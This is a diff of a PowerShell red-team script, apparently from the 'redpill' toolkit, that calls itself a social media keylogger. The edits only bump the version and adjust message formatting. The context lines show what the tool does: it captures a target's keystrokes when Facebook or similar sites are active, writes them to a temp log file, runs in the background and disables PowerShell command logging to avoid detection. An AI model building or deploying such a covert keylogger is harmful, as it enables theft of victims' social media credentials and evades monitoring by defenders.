@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Get-Process,mscore.ps1
    Optional Dependencies: UserLand
-   PS cmdlet Dev version: v1.4.11
+   PS cmdlet Dev version: v1.4.12
    
 .DESCRIPTION
    Capture target keyboard keystrokes if facebook or
@@ -100,7 +100,7 @@
 
 
 Clear-Host
-$CmdletVersion = "v1.4.11"
+$CmdletVersion = "v1.4.12"
 $CurrentTime = (Get-Date -Format 'HH:mm')
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
@@ -117,9 +117,9 @@ $StartBanner = @"
 "@;
 
 write-host $StartBanner -ForegroundColor DarkRed
-write-host "   ♟ GitHub: https://github.com/r00t-3xp10it/redpill ♟" -ForegroundColor DarkYellow
+write-host "  ♟ GitHub: https://github.com/r00t-3xp10it/redpill ♟" -ForegroundColor DarkYellow
 $host.UI.RawUI.WindowTitle = "@SocialMedia $CmdletVersion {SSA@RedTeam}"
-write-host "`n  ╰➤ [" -ForegroundColor Green -NoNewline
+write-host "  ╰➤ [" -ForegroundColor Green -NoNewline
 write-host "$CurrentTime" -NoNewline
 write-host "] 👁‍🗨 Social media key`logger." -ForegroundColor Green
 
@@ -214,7 +214,7 @@ function Invoke-ScheduleStart ()
    Else
    {
       ## Wrong schedule user input error msg
-      write-host "   ╰➤ ⛔️ Abort: " -ForegroundColor Red -NoNewline
+      write-host "     ╰➤ ⛔️ Abort: " -ForegroundColor Red -NoNewline
       write-host "wrong -schedule '" -NoNewline
       write-host "$Schedule" -ForegroundColor Red -NoNewline
       write-host "' input! [exec:" -NoNewline
@@ -270,7 +270,7 @@ function Invoke-IsBrowserActive ()
    ## Make sure we have active browser names
    If([string]::IsNullOrEmpty($TestBrowsers))
    {
-      write-host "`n   ⛔️ Error: none supported browsers found active.`n" -ForegroundColor Red
+      write-host "`n  ⛔️ Error: none supported browsers found active.`n" -ForegroundColor Red
       exit ## Exit cmdlet execution (default)
    }
 }
@@ -392,7 +392,7 @@ If($Mode -iMatch '^(start)$')
                {
                   ## Print info onscreen
                   write-host "`n   Browser Name    : $Item"
-                  write-host "   Social Media    : $SocialSite"            
+                  write-host "   Social Media    : $SocialSite"
                   write-host "   Logfile         : " -NoNewline
                   write-host "$Env:TMP\void.log`n" -ForegroundColor Green
 
@@ -402,13 +402,13 @@ If($Mode -iMatch '^(start)$')
                }
 
                ## Key`logger running -- backup void.log logfile
-               write-host "   🔎 key`logger running in background!"
+               write-host "   🔎 Key`logger running in background!"
                Get-Content -Path "$Env:TMP\void.log" -EA SilentlyContinue|Out-File "$Env:TMP\AUTO_BACKUP.${SocialSite}" -force
 
             }
             Else
             {
-               write-host "   ⛔️ Error: none social media found active!" -ForegroundColor Red
+               write-host "  ⛔️ Error: none social media found active!" -ForegroundColor Red
                If(Test-Path -Path "$Env:TMP\pid.log")
                {
                   ## Kill all PID's
@@ -509,7 +509,7 @@ If($Mode -iMatch '^(stop)$')
    }
    Else
    {
-      write-host "`n   ⛔️ Error: none key`logger logfiles found!`n" -ForegroundColor Red
+      write-host "`n  ⛔️ Error: none key`logger logfiles found!`n" -ForegroundColor Red
    }
 }
 
